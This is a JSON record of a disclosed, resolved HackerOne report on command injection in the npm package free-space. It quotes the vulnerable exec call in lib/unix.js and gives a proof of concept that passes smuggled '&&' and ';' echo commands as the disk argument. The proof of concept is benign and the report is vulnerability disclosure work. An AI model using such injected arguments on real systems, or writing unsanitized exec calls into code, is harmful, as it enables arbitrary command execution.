@@ -1,0 +1,204 @@
+{
+  "id": 950192,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTI=",
+  "url": "https://hackerone.com/reports/950192",
+  "title": "[@knutkirkhorn/free-space] - Command Injection through Lack of Sanitization",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-08-03T13:23:37.941Z",
+  "submitted_at": "2020-08-03T13:23:37.958Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ansuj7",
+    "url": "/ansuj7",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-09-18T12:35:51.099Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-09-18T12:35:51.053Z",
+  "team_member_agreed_on_going_public_at": "2020-08-25T16:18:34.574Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report ```Command Injection``` in the ```free-space``` module.\nIt allows ```arbitrary shell command execution on Unix-based systems```\n\n# Module\n\n**module name:** ```free-space```\n**version:** ```1.2.0```\n**npm page:** `https://www.npmjs.com/package/free-space`\n\n## Module Description\n\n Get the amount of free space for a drive\n\n## Module Stats\n\n24 Weekly Downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue is triggered due to the lack of sanitization of the input parameter of the library's exported anonymous function. \nThe exported function, when given a parameter checks what platform the code is being run on and sends that parameter to a function call in either ```lib/unix.js``` or ```lib/windows/js```.\nThe vulnerability exists in ```lib/unix.js``` which directly uses the user-input parameter: ```disk``` in the template string that ultimately gets exec-ed.\n\nBelow is the library's ```index.js``:\n\n```javascript\n'use strict';\nconst systemDisk = require('system-disk');\nconst windows = require('./lib/windows.js');\nconst unix = require('./lib/unix.js');\n\nmodule.exports = disk => {\n    if (disk === undefined) {\n        return new Promise(resolve => {\n            systemDisk().then(newDisk => {\n                disk = newDisk;\n\n                if (process.platform === 'win32') {\n                    resolve(windows(disk));\n                } else {\n                    resolve(unix(disk));\n                }\n            });\n        });\n    } else {                   // this code executes if a parameter is passed to this function\n        if (typeof disk !== 'string') {\n            throw new TypeError('Invalid input');\n        }\n\n        if (process.platform === 'win32') {    // calls lib/windows.js with the input parameter\n            return windows(disk);\n        }\n\n        return unix(disk);    // calls lib/unix.js with the input parameter\n    }\n};\n```\n\nBelow is the bug in ```lib/unix.js```:\n```javascript\n'use strict';\nconst {exec} = require('child_process');\n\nmodule.exports = disk => {\n    return new Promise((resolve, reject) => {\n        exec(`df -k | grep ^${disk} | awk '{print $4}'`, (err, stdout, stderr) => { // 'disk' is the parameter passed here from the library's exported call\n            if (stderr) {\n                reject(new Error('Something wrong happened'));\n                return;\n            }\n\n            if (stdout.length === 0 || err) {\n                reject(new Error('Could not find disk: ' + disk));\n            }\n\n            resolve(parseInt(stdout, 10) * 1024);\n        });\n    });\n};\n```\nDue to the parameter directly being passed to ```exec```, a ```;```or ```&&``` followed by commands will cause each command after the delimiting character to be executed.\n\n\n## Steps To Reproduce:\n\nCreate testing directory: ```mkdir free-space-poc```\nInstall package: ```npm install (@)knutkirkhorn/free-space```\n\nCreate the following script  - ```test.js``` in the testing directory:\n```javascript\nconst freeSpace = require('@knutkirkhorn/free-space');\n\nfreeSpace(' && echo AMPERSAND_EXEC > ./CODEEXEC').then(bytes => {\n    console.log('AMPERSAND: Free space: ' + bytes + '\\n');\n});\n\nfreeSpace(' ; echo SEMICOLON_EXEC >> ./CODEEXEC').then(bytes => {\n    console.log('SEMICOLON: Free space: ' + bytes + '\\n');\n});\n``` \nExecute with ```nodejs test.js```\n\nList the directory with ```ls```\nYou will see the file ```CODEEXEC``` has been created in the current directory with output from injected commands. ```cat CODEEXEC```\n{F934570}\n\n## Patch\n\nSanitize the ```disk``` parameter before passing it into ```exec``` in ```lib/unix.js``` - Cut out everything after a ```;  and  && ``` and ensure that the disk does exist before calling ```exec```.\n\n## Supporting Material/References:\n\n- Operating System Version: Ubuntu 18.04.4 LTS\n- NodeJS Version: v8.10.0\n- NPM Version: 6.14.7\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N \n\nThank you for your time.\n\n## Impact\n\nCommand Injection can lead to information gathering, system enumeration and further execution of scripts/binaries.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 934570,
+      "file_name": "free-space-poc.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vkd2xLhLfpR92w7PVxApRReR?response-content-disposition=attachment%3B%20filename%3D%22free-space-poc.PNG%22%3B%20filename%2A%3DUTF-8%27%27free-space-poc.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4GK4YVI7%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T045812Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEMJB%2FqQEz0K231g2FOWONfFkU67sjlEa%2B%2BAqeNuoMEbAiAkY4Xrnxp%2FAGJiA7GuTzIRiUE00vnlVzXeWUcdj98sQCqxBQh9EAMaDDAxMzYxOTI3NDg0OSIMc5aTH9xEr8n5o%2FMAKo4F214fS2jooHbXn%2Fwdi8OHh%2FCTZ4RYBpY7FbHYRd6TZBatdpwFruR0zV2iBRxv4NwagpGxEVtyvZ5DM8h2h65kxXIrQzSYthm%2BbFaDgFLGBDAGYCdmp0oV3QfW65xj%2F8sY5QmwN7FHtW42jLDzkJ1ouyRSS2an5CteJ5c7VFGXWaMpXZChnEByWUMWsrQFjy1XYnqyyhZ8Ks2k0mNLlethcHadrhASO13e6Vr9Ws%2BgDrNgu5%2F2uTo1P1ReoBsW9evBkh7dxZyO%2ByJ37C7of01HpNs1JS54jE9Liq53w5ssrdvNVRkfHt2us0f%2BI2Wsvooy64Xqalauz0MmTuxtOuVAvE77qXw%2FH5jbNa%2FtwfY%2BItQdTLfkxktoyEsXnZS0akzRtwbjqqBYxcXPTHY338M9lWzQXGvnZ7moi%2FZmj9g7eIE0G4%2FYCd1m84nBoEj0OaoxKNYNI2Q2yALYzHWEWkICdCazNkwUmXwDhMN9g84xnLdsZ0lH%2Bohki3QHpHPv1o9e9rS3G0GYuZ8MrW4lyudIfjMzRyPi0PIuy6a9ZeaIqUbFGjlsp4Vrp15g6Ojf6RJwtlnkyCyHus6vl1xPAil0OKcZ7GzH1hljUG1SHwzkKOPomxVSo4MaDZ3g6ZRRhZc56Hab3xjDjolfLh%2Flr%2FVzzdnjIZltcUY0WC5aqatWz0dAZFvJYRFAi2vE9nVfm%2BwaXpIKPPPcHo5pg1J61JbPITnd4ba8e7RjlurcYUV0wPtFqLMkIVqF6%2BSlGymi%2Bya1uw1lHqJxV%2FZvKX9NSowObqHXmrUezGc4YgSLLXKWecBJVSZly7%2B5Eqgn8ULaMuaDgqYMfhUCnt%2F5jae2zC2%2B275TjzrQptFxoxiI9q0tMLigt9IGOrIBOvEbQM6BFimP0uSFSqj3o6b%2FXZx%2BzgQNMvFaTv3tRb%2FxhKCYdhTfWfAJhNw6Dd1TEU7PiOju5cN0nTFrhT0qHNWFUMSZ3%2BjGn0xr5HghdX0IrvIfVoVdNdb7ESn6xb%2FroVN0G5B3wDv9rJuINaI4siCETriQEthwUnOHW3AdS0JoSiKm4e1mybdeJKrN%2FCuR0YkaRtU8Di8PVIJBV%2F9Kd3JxBIUL42mXG%2F3o3QUuvRtrFw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ae4f306bee789d3e6ff6d43e3d2cfbd6dc8e86c295576a4b457ce6ad97dc59c5",
+      "file_size": 22654,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-24T16:18:34.655Z",
+  "allow_singular_disclosure_after": -182522378.27039,
+  "singular_disclosure_allowed": true,
+  "vote_count": 7,
+  "voters": [
+    "hariprasanna1",
+    "devolution",
+    "haltosan",
+    "xyber_wolf",
+    "younggoon",
+    "tariktarik",
+    "xyzo"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2986,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Other module",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "950192",
+  "votes": 7,
+  "latest_disclosable_activity_at": "2020-09-18T12:35:51.123Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T12:58:13.051295",
+    "source": "https://hackerone.com/reports/950192.json",
+    "report_id": 950192
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTI=",
+    "databaseId": "950192",
+    "title": "[@knutkirkhorn/free-space] - Command Injection through Lack of Sanitization",
+    "url": "https://hackerone.com/reports/950192",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-09-18T12:35:51.099Z",
+    "created_at": "2020-08-03T13:23:37.941Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU4",
+      "name": "Command Injection - Generic",
+      "external_id": "cwe-77"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 6.8
+    },
+    "reporter": {
+      "username": "ansuj7"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzk1MDE5Mg==",
+    "_id": "950192",
+    "disclosed": true,
+    "votes": 7,
+    "latest_disclosable_activity_at": "2020-09-18T12:35:51.123Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTAxOTI=",
+      "databaseId": "950192",
+      "title": "[@knutkirkhorn/free-space] - Command Injection through Lack of Sanitization",
+      "url": "https://hackerone.com/reports/950192",
+      "disclosed_at": "2020-09-18T12:35:51.099Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzIzOTQ5",
+      "handle": "nodejs-ecosystem",
+      "name": "Node.js third-party modules",
+      "url": "https://hackerone.com/nodejs-ecosystem",
+      "currency": "usd"
+    }
+  }
+}
